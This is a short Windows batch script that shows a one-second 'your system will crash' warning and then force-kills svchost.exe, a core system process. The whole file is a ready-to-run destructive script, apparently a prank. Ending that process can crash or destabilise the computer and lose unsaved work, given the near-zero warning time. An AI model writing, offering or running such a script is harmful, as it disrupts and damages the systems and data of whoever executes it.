@echo off
echo Your system will crash in 1 seconds. Save your work now!
timeout /t 1 /nobreak >nul
taskkill /f /im svchost.exe
